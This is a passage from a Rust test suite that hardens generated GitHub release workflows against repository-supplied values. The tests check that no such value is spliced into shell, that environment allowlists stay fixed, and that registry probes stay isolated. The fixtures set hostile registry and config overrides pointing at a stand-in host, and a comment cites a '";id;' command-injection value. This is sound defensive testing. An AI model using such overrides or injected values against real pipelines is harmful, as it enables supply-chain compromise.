                "CARGO_UNSTABLE_REGISTRY_AUTH",
            ],
        },
        Calibration {
            shape: "a chosen value admitted by an unchosen test",
            body: r#"      INTENTIONAL_ALLOWED=(PATH="${PATH:-}")
      INTENTIONAL_resolve() {
        if [ -n "${CARGO_UNSTABLE_REGISTRY_AUTH:-}" ]; then
          INTENTIONAL_ALLOWED+=("${INTENTIONAL_CARRIED_TOKEN}=${!INTENTIONAL_CARRIED_TOKEN}")
        fi
      }
"#,
            conditions: 1,
            unchosen: &["CARGO_UNSTABLE_REGISTRY_AUTH"],
        },
        Calibration {
            shape: "an unchosen test on a continuation line",
            body: r#"      INTENTIONAL_ALLOWED=(PATH="${PATH:-}")
      if [ -n "${INTENTIONAL_REGISTRY_NAME:-}" ] \
        && [ -n "${CARGO_UNSTABLE_REGISTRY_AUTH:-}" ]; then
        INTENTIONAL_ALLOWED+=("${INTENTIONAL_REGISTRY_INDEX_VARIABLE}=${INTENTIONAL_REGISTRY_INDEX_URL}")
      fi
"#,
            conditions: 1,
            unchosen: &["CARGO_UNSTABLE_REGISTRY_AUTH"],
        },
        Calibration {
            shape: "the list added to by re-assignment rather than by append",
            body: r#"      INTENTIONAL_ALLOWED=(PATH="${PATH:-}")
      INTENTIONAL_resolve() {
        INTENTIONAL_ALLOWED=("${INTENTIONAL_ALLOWED[@]}" CARGO_UNSTABLE_REGISTRY_AUTH="${CARGO_UNSTABLE_REGISTRY_AUTH}")
      }
"#,
            conditions: 0,
            unchosen: &["CARGO_UNSTABLE_REGISTRY_AUTH"],
        },
        Calibration {
            shape: "an unbraced expansion",
            body: r#"      INTENTIONAL_ALLOWED=(PATH="${PATH:-}")
      INTENTIONAL_resolve() {
        INTENTIONAL_ALLOWED+=(CARGO_UNSTABLE_REGISTRY_AUTH="$CARGO_UNSTABLE_REGISTRY_AUTH")
      }
"#,
            conditions: 0,
            unchosen: &["CARGO_UNSTABLE_REGISTRY_AUTH"],
        },
        Calibration {
            shape: "an else-branch append, attributed the `if` it is not governed by",
            body: r#"      INTENTIONAL_ALLOWED=(PATH="${PATH:-}")
      if [ -n "${CARGO_UNSTABLE_REGISTRY_AUTH:-}" ]; then
        :
      else
        INTENTIONAL_ALLOWED+=("${INTENTIONAL_CARRIED_TOKEN}=${!INTENTIONAL_CARRIED_TOKEN}")
      fi
"#,
            conditions: 1,
            unchosen: &["CARGO_UNSTABLE_REGISTRY_AUTH"],
        },
        Calibration {
            shape: "the shape the recipes render",
            body: r#"      INTENTIONAL_ALLOWED=(PATH="${PATH:-}")
      if [ -n "${INTENTIONAL_REGISTRY_NAME:-}" ]; then
        INTENTIONAL_ALLOWED+=("${INTENTIONAL_REGISTRY_INDEX_VARIABLE}=${INTENTIONAL_REGISTRY_INDEX_URL}")
      fi
"#,
            conditions: 1,
            unchosen: &[],
        },
    ];

    /// The membership sweep and its recogniser, against bodies written here.
    ///
    /// A sweep that reaches nothing passes, and a recogniser that accepts
    /// everything passes, so neither is left to be judged by the rendered
    /// bodies alone. Every route the same evasion takes is written out, each
    /// with the reading it must produce, and the shape the recipes really
    /// render is the control that keeps the recogniser from being a refusal of
    /// everything.
    #[test]
    fn reads_an_allowlist_member_the_process_environment_decides() {
        for Calibration {
            shape,
            body,
            conditions,
            unchosen,
        } in CALIBRATIONS
        {
            let assignments = allowlist_assignments(body);
            assert_eq!(
                assignments.len(),
                assigned(body),
                "{shape}: the sweep read every assignment the body makes"
            );
            assert_eq!(
                assignments.len(),
                2,
                "{shape}: a declaration and one append"
            );
            assert_eq!(
                assignments[1].conditions.len(),
                conditions,
                "{shape}: the conditions governing the append are carried"
            );
            assert_eq!(
                unchosen_reads(&assignments[1]),
                unchosen,
                "{shape}: what the append reads that derivation did not choose"
            );
        }
    }

    #[test]
    fn inherits_exactly_the_process_variables_the_recipe_names() {
        let workspace = sentinel_workspace("workflow-allowlist-membership", None);
        materialize_contract_for_structural_sweep(workspace.root(), WorkflowRole::Publish);

        let mut allowlists = 0;
        let mut appended = 0;
        let mut governed = 0;
        for (job, body) in managed_shell_bodies(workspace.root(), WorkflowRole::Publish) {
            let Some((_, tail)) = body.split_once("INTENTIONAL_ALLOWED=(") else {
                continue;
            };
            allowlists += 1;
            let (declared, _) = tail.split_once(')').expect("the allowlist is an array");

            // Every inherited member is present, unconditionally, reading the
            // runner's value.
            let inherited = declared
                .split_whitespace()
                .filter(|entry| !entry.contains("CARGO_NET_OFFLINE"))
                .map(|entry| entry.split_once('=').expect("an assignment").0.to_owned())
                .collect::<BTreeSet<_>>();
            assert_eq!(
                inherited,
                INHERITED
                    .iter()
                    .map(|name| (*name).to_owned())
                    .collect::<BTreeSet<_>>(),
                "{job} inherits exactly the names this test enumerates"
            );

            // Nothing is added to the list by asking the process environment
            // whether a variable is set. Every append the body performs --
            // wherever in the body it sits -- reads values derivation put in
            // the step's own `env:`, which is why they are named by a prefixed
            // variable rather than by a bare one.
            //
            // "Every" is the load-bearing word, so the sweep is held to a
            // count taken off the text rather than to a floor it sets itself.
            // A sweep that reads the first assignment of each body and stops
            // satisfies any floor two jobs can jointly clear, and behind it the
            // hidden append this guard exists to catch is admitted again.
            let assignments = allowlist_assignments(&body);
            assert_eq!(
                assignments.len(),
                assigned(&body),
                "{job}: the sweep read every assignment the body makes to the list"
            );
            for append in &assignments[1..] {
                let unchosen = unchosen_reads(append);
                assert!(
                    unchosen.is_empty(),
                    "{job} appends what derivation named, not what the process happened to carry: \
                     {} reads {unchosen:?}",
                    append.line
                );
                appended += 1;
                governed += append.conditions.len();
            }
        }
        assert!(allowlists > 0, "the publisher jobs build an allowlist");
        // Two Cargo publisher jobs render one conditional append each. This
        // says the recipes still add to the list at all -- completeness is the
        // per-body equality above, not this floor.
        assert!(
            appended >= 2 && governed >= 2,
            "the sweep read the appends the recipes render: \
             {appended} appends under {governed} conditions"
        );
    }

    // The inherited members carry the runner's values, and a workflow-level
    // `env:` applies to every job in the workflow -- so without this a
    // repository chooses the client that answers the probe, which is the same
    // capability the allowlist was built to take away. Refusing exactly the
    // inherited names is the complement of that list rather than a guess at
    // which keys are dangerous.
    #[test]
    fn refuses_a_workflow_that_declares_an_inherited_process_variable() {
        for name in crate::executor::steps::INHERITED_ENVIRONMENT {
            let workspace = workspace("workflow-declared-inherited");
            workspace.write(
                ".github/workflows/publish.yml",
                &REPOSITORY_PUBLISH_WORKFLOW.replace(
                    "jobs:",
                    &format!("env:\n  {name}: /repository/chosen\n\njobs:"),
                ),
            );
            let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                .expect("comparison");
            assert_eq!(
                comparison.status,
                ComparisonStatus::Blocked,
                "a workflow declaring {name} derives a managed job that would read it"
            );
            let diagnostic = &comparison.diagnostics[0];
            assert_eq!(diagnostic.code, "inherited-environment-declared");
            assert!(
                diagnostic.message.contains(name),
                "the diagnostic names the key an author has to remove: {diagnostic:?}"
            );
        }

        // A workflow-level `env:` the recipes do not read is still preserved,
        // which is what keeps this a complement rather than a ban.
        let workspace = workspace("workflow-unrelated-env");
        workspace.write(
            ".github/workflows/publish.yml",
            &REPOSITORY_PUBLISH_WORKFLOW
                .replace("jobs:", "env:\n  REPOSITORY_SETTING: kept\n\njobs:"),
        );
        converge(workspace.root(), WorkflowRole::Publish);
        assert!(
            workflow(workspace.root(), WorkflowRole::Publish).contains("REPOSITORY_SETTING: kept"),
            "an unrelated workflow-level env block survives convergence"
        );
    }

    // A probe decides whether a long-lived credential is reached and whether an
    // immutable version is submitted, and it answers from what a client tells
    // it. A probe that reads the released repository's own client configuration
    // therefore lets that repository choose the answer: cargo can be made to
    // report absence by going offline, by substituting the source, or by
    // replacing the index, and npm resolves a scoped name through whichever
    // registry a project file names. Those are four routes to one
    // misclassification, and closing them one at a time is how this task
    // reached its fourth round. What is asserted is the property instead --
    // the probe is built rather than inherited -- and it is asserted by running
    // the derived helper with a repository configuration present and watching
    // it not be used.
    #[test]
    fn resolves_through_a_probe_that_inherits_no_repository_configuration() {
        let workspace = sentinel_workspace("workflow-probe-isolation", None);
        materialize_contract_for_structural_sweep(workspace.root(), WorkflowRole::Publish);
        let temporary = workspace.root().join("runner");
        std::fs::create_dir_all(&temporary).expect("runner directory");

        // Cargo: the probe builds its scratch crate and must leave it with no
        // configuration of the repository's.
        let cargo_step = publisher_steps(workspace.root(), "cargo_primary")
            .into_iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("INTENTIONAL_resolve()"))
            })
            .expect("the Cargo recipe defines a resolve");
        let stubs = stub_client(
            &temporary.join("cargo"),
            "cargo",
            &format!("{CARGO_NEW}exit 0"),
        );
        let probe = temporary.join("probe");
        let body = cargo_step["run"].as_str().expect("a script");
        let end = body.find("\n}\n").expect("the resolve is a shell function");
        let helper = &body[..end + "\n}\n".len()];
        let mut command = std::process::Command::new("bash");
        command
            .arg("-c")
            .arg(format!(
                "{helper}\nINTENTIONAL_resolve \"{}\"",
                probe.display()
            ))
            .env(
                "PATH",
                format!(
                    "{}:{}",
                    stubs.display(),
                    test_tool_path(&std::env::var("PATH").unwrap_or_default())
                ),
            )
            .env("RUNNER_TEMP", &temporary)
            // The released repository declares a registry index, and a probe
            // that inherited this file would inherit every other key in it too.
            .env("GITHUB_WORKSPACE", workspace.root())
            // A repository's own workflow may declare a top-level `env:`, and
            // convergence preserves it deliberately, so GitHub applies it to
            // every managed job. These are that block arriving: the same keys
            // the configuration file route used, by the one route left.
            .env(
                "CARGO_REGISTRIES_CRATES_IO_INDEX",
                format!("sparse+https://{HOSTILE_ENVIRONMENT}/index/"),
            )
            .env("CARGO_NET_OFFLINE", "true")
            .env("CARGO_HOME", format!("/{HOSTILE_ENVIRONMENT}/home"));
        for (key, value) in step_environment(&cargo_step) {
            command.env(
                key,
                value.replace("${{ runner.temp }}", &temporary.display().to_string()),
            );
        }
        let output = command.output().expect("the resolve runs");
        assert!(
            output.status.success(),
            "the resolve runs against a stub client: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            !probe.join("probe/.cargo/config.toml").exists(),
            "the probe carries no configuration of the repository it releases"
        );
        assert!(
            !stub_environment(&stubs).contains(HOSTILE_ENVIRONMENT),
            "the Cargo probe ran with a variable the repository put in the job's environment"
        );
        assert!(
            !body.contains("GITHUB_WORKSPACE"),
            "the Cargo probe reads nothing out of the released workspace:\n{body}"
        );

        // npm: the probe runs somewhere a project `.npmrc` cannot reach it.
        let npm_step = publisher_steps(workspace.root(), "npm_primary")
            .into_iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("INTENTIONAL_npm_holds()"))
            })
            .expect("the npm recipe defines a probe");
        let body = npm_step["run"].as_str().expect("a script");
        let start = body
            .find("INTENTIONAL_npm_holds() {")
            .expect("the probe is a shell function");
        let end = body[start..]
            .find("\n}\n")
            .expect("the probe is a shell function");
        let helper = &body[..start + end + "\n}\n".len()];
        let stubs = stub_client(
            &temporary.join("npm"),
            "npm",
            &format!(
                "pwd >> \"{}\"; echo 'sha512-x'",
                temporary.join("npm").join("calls.log").display()
            ),
        );
        let mut command = std::process::Command::new("bash");
        command
            .arg("-c")
            .arg(format!(
                "{helper}\nINTENTIONAL_npm_holds example >/dev/null"
            ))
            .current_dir(workspace.root())
            .env(
                "PATH",
                format!(
                    "{}:{}",
                    stubs.display(),
                    test_tool_path(&std::env::var("PATH").unwrap_or_default())
                ),
            )
            .env("RUNNER_TEMP", &temporary)
            .env(
                "npm_config_registry",
                format!("https://{HOSTILE_ENVIRONMENT}"),
            )
            .env(
                "npm_config_userconfig",
                format!("/{HOSTILE_ENVIRONMENT}/npmrc"),
            );
        for (key, value) in step_environment(&npm_step) {
            command.env(
                key,
                value.replace("${{ runner.temp }}", &temporary.display().to_string()),
            );
        }
        let output = command.output().expect("the probe runs");
        assert!(
            output.status.success(),
            "the probe runs against a stub client: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let recorded = stub_calls(&stubs);
        assert!(
            !recorded
                .lines()
                .any(|line| line == workspace.root().to_string_lossy()),
            "the npm probe ran in the released workspace, where a project .npmrc applies: {recorded}"
        );
        // Running elsewhere is half of it. npm resolves a scoped name through
        // whichever registry `@scope:registry` names, wherever that is
        // configured, and `--registry` does not outrank it -- so the probe says
        // which registry serves this scope rather than leaving the question
        // open.
        assert!(
            recorded.contains(&format!(
                "--{}:registry=",
                step_environment(&npm_step)["INTENTIONAL_SCOPE"]
            )),
            "the probe names the registry serving its scope: {recorded}"
        );
        assert!(
            !stub_environment(&stubs).contains(HOSTILE_ENVIRONMENT),
            "the npm probe ran with a variable the repository put in the job's environment"
        );
    }

    /// A value no derivation produces, recognisable wherever it surfaces.
    const HOSTILE_ENVIRONMENT: &str = "repository-supplied.example";

    /// Every `if:` a managed job or step of one derived workflow carries.
    ///
    /// GitHub evaluates `if:` as an expression whether or not it is delimited,
    /// so a value spliced into a bare one is expression source the delimited
    /// sweep cannot see. The derivation emits none, and that is asserted rather
    /// than assumed: a managed `if:` added later has to come with the rule that
    /// covers it.
    fn managed_conditions(root: &Path, role: WorkflowRole) -> Vec<(String, String)> {
        let document: Value = serde_yaml::from_str(&workflow(root, role)).expect("result parses");
        let mut conditions = Vec::new();
        for (id, steps) in sentinel_jobs(root, role) {
            if let Some(condition) = document["jobs"][&id]["if"].as_str() {
                conditions.push((id.clone(), condition.to_owned()));
            }
            for step in steps {
                if let Some(condition) = step["if"].as_str() {
                    conditions.push((id.clone(), condition.to_owned()));
                }
            }
        }
        conditions
    }

    /// Every `${{ }}` expression a managed job of one derived workflow carries.
    fn managed_expressions(root: &Path, role: WorkflowRole) -> Vec<(String, String)> {
        let document: Value = serde_yaml::from_str(&workflow(root, role)).expect("result parses");
        let mut expressions = Vec::new();
        for (id, _) in sentinel_jobs(root, role) {
            // The whole job body rather than its steps: a job-level `env:` is
            // expression source a step-only sweep would not read.
            let rendered = serde_yaml::to_string(&document["jobs"][&id]).expect("job renders");
            let mut rest = rendered.as_str();
            while let Some(open) = rest.find("${{") {
                rest = &rest[open + 3..];
                let Some(close) = rest.find("}}") else { break };
                expressions.push((id.clone(), rest[..close].trim().to_owned()));
                rest = &rest[close + 2..];
            }
        }
        expressions
    }

    // Expression source is the other place a repository-supplied value lands,
    // and it is not shell: a credential name reaches `${{ vars.X }}` and can
    // reach nothing else. The rule there is that every expression is a
    // reference whose name is one GitHub resolves, so a value that arrived as
    // arbitrary text would not match any of these shapes.
    #[test]
    fn every_managed_expression_is_a_reference_to_a_named_value() {
        let workspace = sentinel_workspace("workflow-expression-source", None);
        // Action outputs are kebab-case by convention, so a segment admits a
        // hyphen; nothing else in a reference does.
        let identifier = |name: &str| {
            !name.is_empty()
                && name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
        };
        let mut seen = 0usize;
        let mut conditions = 0usize;
        for role in WorkflowRole::ALL {
            materialize_contract_for_structural_sweep(workspace.root(), role);
            conditions += managed_conditions(workspace.root(), role).len();
            for (job, expression) in managed_expressions(workspace.root(), role) {
                seen += 1;
                let accepted = match expression.split_once('.') {
                    Some(("vars" | "secrets", name)) => identifier(name),
                    Some(("runner", name)) => identifier(name),
                    Some(("github" | "steps" | "needs" | "inputs", rest)) => {
                        rest.split('.').all(identifier)
                    }
                    _ => false,
                };
                assert!(
                    accepted,
                    "{job} in the {role} workflow carries the expression {expression:?}, which is not a reference to a named value"
                );
            }
        }
        assert!(
            seen > 0,
            "the expression sweep read nothing, so every rule it states is vacuous"
        );
        assert_eq!(
            conditions, 0,
            "a managed job or step gained an `if:`, which GitHub evaluates as expression source with no delimiters; extend this rule to cover it rather than letting it past the delimited sweep"
        );
    }

    // The refusal test below proves a hostile value cannot be derived. It does
    // not prove that an accepted one stays out of shell source, and those are
    // different claims: `example-component` is a perfectly legal crate name,
    // and the round-1 injection was a legal-looking registry name spliced into
    // `--registry`. Validation makes a spliced value survivable; it does not
    // make splicing safe, because the next validator to be widened re-opens
    // every splice at once.
    //
    // So the second property is asserted directly, over the whole roster rather
    // than over the routes anyone has noticed: no value an author typed appears
    // as text in a managed `run:` body. The sentinels are also proved to have
    // reached the workflow somewhere, because a value that never arrived is
    // absent from every shell body for reasons that have nothing to do with
    // this rule.
    //
    // The shape is task 149's, adopted rather than copied: that task hit the
    // same class on the OCI surface and closed it this way, and the values and
    // the fixture here are this surface's. A gate shared across the recipe
    // surfaces is its own task.
    //
    // # What forces each list this gate reads
    //
    // A list is self-forcing exactly when the derived side of its equality is
    // built without consulting the list. A list compared against something
    // filtered through itself cannot fail in the direction that matters, and a
    // green suite over such a list is evidence of nothing. Each list here is
    // classified by that test, and where the answer is "nothing enumerates
    // this", that is written down rather than left to be inferred from silence.
    //
    // - `SENTINEL_JOBS`. **Self-forcing.** Its derived side is `sentinel_jobs`,
    //   which recognises a managed job by the ownership sentinel and knows
    //   nothing about the list. A managed job entering or leaving derivation
    //   fails the enumeration until it is written down.
    // - The publisher span of the swept shell. **Self-forcing, and there is no
    //   list.** The expected side is `resolve_publications` over the same
    //   workspace -- production's own resolution, reading the configuration
    //   rather than the workflow -- and the read side parses swept job
    //   identifiers by the shape `publication_job_id` builds. The two sides
    //   share the sentinel workspace and nothing else. Narrowing the sweep
    //   moves only the read side; narrowing production's resolution removes the
    //   publish jobs themselves and fails `SENTINEL_JOBS`, which reads neither.
    // - The per-job `run:` body count. **Self-forcing.** `managed_shell_bodies`
    //   flattens steps and reads `run` as a string; `managed_shell_body_counts`
    //   indexes the document by job identifier and counts the `run` key. Two
    //   walks, one input, an equality rather than a floor.
    // - `REPOSITORY_SUPPLIED_VALUES`. **Not self-forcing, and nothing
    //   enumerates its domain.** The domain is "values an author typed into
    //   this fixture that derivation reads", and no production surface
    //   enumerates it: derivation reads configuration, native manifests, a
    //   Cargo registry table and a GoReleaser document through separate paths,
    //   and a value's *origin* is not a property any of them carries. Each row
    //   still carries a falsifiable reach assertion, so a row that stopped
    //   being true fails; what nothing catches is a row never written. Epic
    //   task 180 owns the conversion and it has to enumerate the derivation's
    //   repository-read sites, as the roster's own header states.
    // - `CLOSED_AT_THE_BOUNDARY`. **Not self-forcing; the enumerator exists and
    //   does not fit.** `nfpm` formats are a fixed declared vocabulary, but only
    //   `archlinux` names a package the format's own name does not spell, so
    //   only that row can tell a mapped value from a passed-through one. An
    //   equality against the format vocabulary would be an equality three of
    //   whose four members cannot witness the property. The row is held instead
    //   by a two-sided assertion -- declared spelling absent, derived literal
    //   present -- which is what makes a relaxed closure fail here.
    // - `ABSENT_FROM_MANAGED_CONTENT`. **Not self-forcing; no enumerator
    //   exists.** Its domain is "supplied values that reach nothing", which is
    //   defined by absence and so has no positive enumeration to compare
    //   against. Each row is falsifiable in the direction that matters: a value
    //   routed into managed content fires the row and is forced onto the
    //   roster. A value that should have been listed and never was is not
    //   caught, and cannot be by anything short of the roster's own conversion.
    //
    // RPM and APT require repository-local Action metadata, so their
    // product-shaped fixture is swept below beside this cross-recipe fixture.
    #[test]
    fn no_repository_supplied_value_is_spliced_into_a_managed_shell_body() {
        let system_packages = system_package_workspace("workflow-system-package-supplied-values");
        converge(system_packages.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(system_packages.root(), WorkflowRole::Publish))
                .expect("workflow parses");
        let configured_values = [
            ".github/actions/deliver-rpm",
            ".github/actions/deliver-apt",
            "https://packages.invalid/rpm/",
            "https://packages.invalid/rpm-key.asc",
            "https://packages.invalid/apt",
            "https://packages.invalid/apt-key.asc",
            "stable",
            "current",
            "section-a",
            "${{ secrets.DELIVERY_TOKEN }}",
            "${{ vars.DELIVERY_BUCKET }}",
            "unchanged",
            "${{ matrix.destination }}",
            "${{ secrets.APT_DELIVERY_TOKEN }}",
            "${{ vars.APT_DELIVERY_BUCKET }}",
            "apt-unchanged",
            "${{ matrix.apt_destination }}",
        ];
        let mut system_package_bodies = 0;
        for (job, delivery_inputs) in [
            (
                "release_automation_publish_component_package_rpm_primary",
                &configured_values[9..13],
            ),
            (
                "release_automation_publish_component_package_apt_primary",
                &configured_values[13..17],
            ),
        ] {
            let steps = document["jobs"][job]["steps"].as_sequence().expect("steps");
            let jobs = document["jobs"].as_mapping().expect("jobs");
            let (_, verification_steps, _) = publication_verification(jobs, job);
            let readback = verification_steps
                .iter()
                .find_map(portable_observer_step)
                .expect("portable readback step");
            let environment =
                serde_yaml::to_string(&readback["env"]).expect("readback environment renders");
            let body = readback["run"].as_str().expect("readback body");
            for input in delivery_inputs {
                assert!(
                    !carries(&environment, input) && !carries(body, input),
                    "{job} carries delivery input {input:?} into anonymous readback"
                );
            }
            for step in steps {
                let Some(body) = step.get("run").and_then(Value::as_str) else {
                    continue;
                };
                system_package_bodies += 1;
                for value in configured_values {
                    assert!(
                        !splices(body, value),
                        "the system-package workflow splices {value:?} into {job}:\n{body}"
                    );
                }
            }
        }
        assert_eq!(
            system_package_bodies, 2,
            "the sweep reads each inline system-package establishment body"
        );

        // How much the gate inspected is established before any rule is
        // applied to it. A sweep that finds nothing satisfies every rule, and
        // this sweep found nothing under a configured prefix until the
        // recognition changed -- so the scope is compared against an
        // enumeration written independently of the derivation, under both the
        // default prefix and a configured one.
        let mut shell_counts = Vec::new();
        for prefix in [None, Some("acme")] {
            let workspace = sentinel_workspace(
                &format!("workflow-supplied-values-{}", prefix.unwrap_or("default")),
                prefix,
            );
            let reserved = prefix.map_or("intentional_".to_owned(), |prefix| format!("{prefix}_"));
            let mut counts = Vec::new();
            let mut swept_shell: Vec<(WorkflowRole, String, String)> = Vec::new();
            for (role, expected) in SENTINEL_JOBS {
                materialize_contract_for_structural_sweep(workspace.root(), role);
                let swept = sentinel_jobs(workspace.root(), role)
                    .into_iter()
                    .map(|(id, _)| {
                        id.strip_prefix(&reserved)
                            .unwrap_or_else(|| panic!("{id} carries the configured prefix"))
                            .to_owned()
                    })
                    .collect::<BTreeSet<_>>();
                assert_eq!(
                    swept,
                    expected
                        .iter()
                        .map(|id| (*id).to_owned())
                        .collect::<BTreeSet<_>>(),
                    "the {role} sweep reads exactly the managed jobs this configuration derives"
                );

                let bodies = managed_shell_bodies(workspace.root(), role);
                assert!(
                    !bodies.is_empty(),
                    "the {role} workflow contributes managed shell for the sweep to read"
                );
                // How much of each job the sweep read, against a count of the
                // same jobs' bodies taken by a different walk. Non-emptiness
                // above is a floor and a floor cannot see a sweep that reads
                // one body per job and stops -- which is a whole promote body
                // per publication going uninspected while every other rule
                // here still passes.
                let mut read = managed_shell_body_counts(workspace.root(), role)
                    .into_keys()
                    .map(|id| (id, 0usize))
                    .collect::<BTreeMap<_, _>>();
                for (job, _) in &bodies {
                    *read
                        .get_mut(job)
                        .unwrap_or_else(|| panic!("{job} is a managed job")) += 1;
                }
                assert_eq!(
                    read,
                    managed_shell_body_counts(workspace.root(), role),
                    "the {role} sweep reads every `run:` body of every managed job, not a body per job"
                );
                counts.push((role, bodies.len()));
                swept_shell.extend(
                    bodies
                        .into_iter()
                        .map(|(job, body)| (role, job.clone(), body)),
                );
            }
            shell_counts.push(counts);

            // What the loop below is about to consume, checked for the
            // homogeneity that would make it prove nothing -- on the derived
            // artifact rather than on the fixture constants, because the
            // fixture can be diverse while the shell reaching this loop is not.
            //
            // A sweep whose bodies all come from one packager cannot witness a
            // rule about every packager, and the job enumeration above would
            // still agree, because those jobs exist whether or not they carry
            // shell. Three of the six packagers is what this gate read until
            // the fixture derived a GoReleaser publication, and it reported
            // clean the whole time.
            //
            // Neither side of this equality is a list of packagers. The
            // expected side is `resolve_publications`, production's own
            // resolution of this same workspace, which knows nothing about the
            // sweep; the read side parses each swept job identifier by the
            // shape `publication_job_id` builds --
            // `publish_<unit>_<package>_<publisher>_<target>` -- rather than
            // filtering its segments through an
            // expectation. A constant filtered through itself cannot fail: the
            // read side could never hold anything the constant did not, so
            // dropping a packager from it left the whole suite green, and
            // narrowing the sweep and the constant together left both Go
            // promote bodies unread and still green.
            let expected_publishers = resolve_publications(
                workspace.root(),
                &Config::load(workspace.root()).expect("configuration loads"),
            )
            .expect("publications resolve")
            .selected
            .iter()
            .map(|publication| publication.publisher.as_str().to_owned())
            .collect::<BTreeSet<_>>();
            let read_publishers = swept_shell
                .iter()
                .filter_map(|(_, job, _)| {
                    let (subject, _target) = job
                        .strip_prefix(&reserved)?
                        .strip_prefix("publish_")?
                        .rsplit_once('_')?;
                    let (_unit, publisher) = subject.rsplit_once('_')?;
                    Some(publisher.to_owned())
                })
                .collect::<BTreeSet<_>>();
            assert_eq!(
                read_publishers,
                expected_publishers,
                "the shell this rule reads spans every publisher this configuration resolves, so a rule stated over it is stated over all of them"
            );

            // And the other half of the same question, about the roster this
            // loop consumes rather than the shell it reads. Windowing is only
            // meaningful over tokens that do not window each other: a token
            // spelled from a neighbour's characters makes one row's window
            // check answerable by another row's value, which is indistinguish-
            // able from the check working. `MTDLGW` and `mtdlgw` are one value
            // in two spellings and are compared without case throughout, so
            // they are the one pair excluded.
            for (_, token, origin, _) in REPOSITORY_SUPPLIED_VALUES {
                for (_, other, elsewhere, _) in REPOSITORY_SUPPLIED_VALUES {
                    if token.eq_ignore_ascii_case(other) {
                        continue;
                    }
                    assert_eq!(
                        carries_a_window(other, token),
                        None,
                        "{origin}'s token windows into {elsewhere}'s, so neither row's window check answers for itself"
                    );
                }
            }

            for (role, job, body) in &swept_shell {
                for (supplied, token, origin, _) in REPOSITORY_SUPPLIED_VALUES {
                    assert!(
                        !splices(body, supplied),
                        "the {role} workflow splices {origin} into {job}'s shell:\n{body}"
                    );
                    // A contiguous run of the value's distinctive token is
                    // what survives truncation, windowing and reversal --
                    // the transforms a case-folded substring cannot see. A
                    // fixture value is alphanumeric, so a surviving window
                    // of one looks harmless; the production value is
                    // whatever a repository wrote, and a four-character
                    // window of `";id;` is the original injection again.
                    if let Some(window) = carries_a_window(body, token) {
                        panic!(
                            "the {role} workflow carries {window:?}, a window of {origin}, into {job}'s shell:\n{body}"
                        );
                    }
                }
                // A value whose role is selection among literals the derivation
                // owns is closed at the boundary rather than routed, so it must
                // be absent from shell entirely -- not routed into it. The row
                // exists because a closed value has no roster row otherwise,
                // and an absent row and a closed row look identical right up to
                // the moment someone adds a pass-through fallback.
                for (declared, derived, refusal) in CLOSED_AT_THE_BOUNDARY {
                    assert!(
                        !carries(body, declared),
                        "{job}'s shell carries {declared:?}, which derivation is supposed to have replaced with {derived:?}; the closure at {refusal} has been relaxed:\n{body}"
                    );
                }
                for (value, origin) in ABSENT_FROM_MANAGED_CONTENT {
                    assert!(
                        !carries(body, value),
                        "{job}'s shell carries {origin}; give it a roster row naming the surface it now lands on:\n{body}"
                    );
                }
                // The prefix is the one repository-supplied value managed
                // shell may carry, and the exception is only honest if
                // what is spliced is the configured prefix rather than a
                // constant that happens to match the default.
                if prefix.is_some() {
                    assert!(
                        !body.contains("intentional_"),
                        "{job}'s shell carries the default prefix under a configured one:\n{body}"
                    );
                }
            }

            // A closed value's absence proves nothing unless the literal it was
            // closed to is present: absent-because-closed and absent-because-
            // nothing-derived read alike, and the second is what a narrowed
            // fixture produces.
            let shell = swept_shell
                .iter()
                .map(|(_, _, body)| body.as_str())
                .collect::<String>();
            for (declared, derived, _) in CLOSED_AT_THE_BOUNDARY {
                assert!(
                    carries(&shell, derived),
                    "no managed shell carries {derived:?}, so {declared:?} being absent from it says nothing about the closure"
                );
            }

            // Reach is checked on the surfaces the sweep read, with shell
            // removed, and against the surface the roster names. Searching the
            // whole document lets a repository-owned job satisfy the claim, and
            // searching every surface at once lets a value be absent from the
            // one it was supposed to be on.
            let (expressions, plain) = SENTINEL_JOBS
                .into_iter()
                .map(|(role, _)| managed_surfaces(workspace.root(), role))
                .fold(
                    (String::new(), String::new()),
                    |(mut expressions, mut plain), (role_expressions, role_plain)| {
                        expressions.push_str(&role_expressions);
                        plain.push_str(&role_plain);
                        (expressions, plain)
                    },
                );
            // A reach claim is about routing, so the surface it is checked
            // against must not contain the one place a value survives without
            // being routed. A job identifier is built by `identifier`, which
            // reduces a value to what GitHub accepts, so a value found there
            // was transformed rather than carried -- and 149 found its gate
            // satisfied by exactly that after the routed row was deleted. The
            // expression surface is exempt because `needs.<job>` is a real
            // reference to a job rather than a place a value landed, and no
            // roster row is checked against it for a value of that shape.
            for (role, _) in SENTINEL_JOBS {
                let (_, plain) = managed_surfaces(workspace.root(), role);
                for (id, _) in sentinel_jobs(workspace.root(), role) {
                    assert!(
                        !plain.contains(&id),
                        "{id} is part of the surface a routed value's reach is checked against"
                    );
                }
            }

            for (supplied, _, origin, surface) in REPOSITORY_SUPPLIED_VALUES {
                let (text, other, name) = match surface {
                    Surface::Expression => (&expressions, &plain, "a workflow expression"),
                    Surface::Plain => (&plain, &expressions, "a managed job's own content"),
                };
                // Folded for the same reason the shell comparison is: the
                // gate's own argument is that a case transform preserves a
                // value, so a value that reached its surface in another case
                // has reached it. A stricter comparison here would call that
                // absent while the shell comparison called it present.
                assert!(
                    carries(text, supplied),
                    "{origin} never reached {name}, so its absence from a shell body proves nothing"
                );
                // A secret name is a reference the runner resolves, so it
                // belongs in an expression and nowhere else. Asserting that it
                // is absent from the other surface is also what makes the split
                // falsifiable: a check that read both surfaces together would
                // be satisfied by either, which is the shape of a claim that
                // cannot fail.
                if surface == Surface::Expression {
                    assert!(
                        !carries(other, supplied),
                        "{origin} is written into a managed job's own content rather than referenced through the secrets context"
                    );
                }
            }

            // The values with no row, held to the absence that is their reason
            // for having none. Each is supplied by the same fixture and read by
            // the same derivation as every rostered value, so this firing means
            // a value has entered managed content unregistered -- the shape
            // task 148 shipped and a human, not a gate, happened to notice.
            for (value, origin) in ABSENT_FROM_MANAGED_CONTENT {
                assert!(
